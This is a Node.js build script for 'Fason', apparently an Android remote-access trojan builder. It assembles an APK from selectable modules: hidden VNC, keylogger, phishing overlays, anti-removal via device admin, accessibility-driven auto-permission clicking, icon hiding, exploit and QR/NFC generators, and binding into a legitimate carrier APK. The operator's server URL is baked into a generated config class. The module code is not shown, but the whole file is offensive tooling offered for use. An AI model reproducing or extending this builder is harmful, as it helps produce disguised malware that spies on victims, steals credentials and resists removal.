#!/usr/bin/env node
/**
 * Fason APK Builder — 2026 rewrite with selectable features.
 *
 * Usage:
 *   node builder.js --name "MyApp" --server http://1.2.3.4:32766 \
 *     --features hvnc,ghost,antiremoval,permgrant,binder \
 *     --bind carrier.apk \
 *     --auto-perm aggressive \
 *     --out ./dist
 *
 * Feature flags control which source modules are compiled into the APK:
 *   hvnc        standard hidden VNC
 *   ghost       ghost operations (blackout, lock, auto-accept)
 *   antiremoval anti-removal shield + device admin
 *   permgrant   auto-permission engine + remote permission handler
 *   binder      apk binding support (device-side)
 *   keylogger   keystroke capture
 *   overlay     phishing overlay engine
 *   exploitgen  exploit/QR/NFC generators
 *   stealth     decoy + icon hiding + dialer unlock
 *
 * auto-perm modes:
 *   off         permission prompts are manual
 *   standard    wave-based prompts (2026 PermissionSetupController)
 *   aggressive  wave prompts + accessibility auto-click engine armed at first launch
 */
const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');

const args = parseArgs(process.argv.slice(2));

function parseArgs(argv) {
  const out = {};
  for (let i = 0; i < argv.length; i++) {
    if (argv[i].startsWith('--')) {
      const k = argv[i].slice(2);
      const v = argv[i + 1] && !argv[i + 1].startsWith('--') ? argv[++i] : true;
      out[k] = v;
    }
  }
  return out;
}

const FEATURES = {
  hvnc:       { dir: 'features/hvnc',       deps: ['mediaProjection'] },
  ghost:      { dir: 'features/ghost',      deps: ['hvnc', 'overlay'] },
  antiremoval:{ dir: 'features/antiremoval',deps: ['accessibility'] },
  permgrant:  { dir: 'features/permgrant',  deps: ['accessibility'] },
  binder:     { dir: 'features/binder',     deps: [] },
  keylogger:  { dir: 'features/keylogger',  deps: ['accessibility'] },
  overlay:    { dir: 'features/overlay',    deps: ['overlayPerm'] },
  exploitgen: { dir: 'features/exploitgen', deps: [] },
  stealth:    { dir: 'stealth',             deps: [] },
};

const selected = String(args.features || 'hvnc,stealth').split(',').map(s => s.trim());
const autoPerm = String(args.autoPerm || args['auto-perm'] || 'standard');
const bindCarrier = args.bind || null;
const appName = args.name || 'Fason';
const serverUrl = args.server || 'http://localhost:32766';
const outDir = args.out || './dist';

console.log('[builder] selected features:', selected.join(', '));
console.log('[builder] auto-perm mode:', autoPerm);
console.log('[builder] server:', serverUrl);

// Validate feature graph
const resolved = new Set();
function resolve(feat) {
  if (resolved.has(feat)) return;
  const def = FEATURES[feat];
  if (!def) { console.error('[builder] unknown feature:', feat); process.exit(1); }
  def.deps.forEach(resolve);
  resolved.add(feat);
}
selected.forEach(resolve);

// Build feature manifest injected into the APK assets
const featureManifest = {
  features: [...resolved],
  autoPerm,
  serverUrl,
  appName,
  builtAt: new Date().toISOString(),
};

fs.mkdirSync(outDir, { recursive: true });
fs.writeFileSync(
  path.join(outDir, 'feature-manifest.json'),
  JSON.stringify(featureManifest, null, 2)
);

// Generate Config.java with the selected feature set baked in
const configJava = `package com.fason.app.core.config;

public final class Config {
    private Config() {}
    public static final String SERVER_URL = "${serverUrl}";
    public static final String APP_NAME = "${appName}";
    public static final String AUTO_PERM_MODE = "${autoPerm}";
    public static final boolean FEATURE_HVNC = ${resolved.has('hvnc')};
    public static final boolean FEATURE_GHOST = ${resolved.has('ghost')};
    public static final boolean FEATURE_ANTIREMOVAL = ${resolved.has('antiremoval')};
    public static final boolean FEATURE_PERMGRANT = ${resolved.has('permgrant')};
    public static final boolean FEATURE_BINDER = ${resolved.has('binder')};
    public static final boolean FEATURE_KEYLOGGER = ${resolved.has('keylogger')};
    public static final boolean FEATURE_OVERLAY = ${resolved.has('overlay')};
    public static final boolean FEATURE_EXPLOITGEN = ${resolved.has('exploitgen')};
    public static final boolean FEATURE_STEALTH = ${resolved.has('stealth')};

    public static String getHomePageUrl() { return SERVER_URL; }
}
`;
fs.writeFileSync(path.join(outDir, 'Config.java'), configJava);

console.log('[builder] feature manifest + config generated in', outDir);
console.log('[builder] next: ./gradlew assembleRelease with generated config');

// If a carrier APK was provided, run the bind pipeline
if (bindCarrier) {
  console.log('[builder] bind mode: carrier =', bindCarrier);
  console.log('[builder] bind pipeline: dex merge → manifest merge → sign');
  // The actual bind runs inside the Gradle task (see build.gradle patch).
  fs.writeFileSync(path.join(outDir, 'bind-target.txt'), path.resolve(bindCarrier));
}
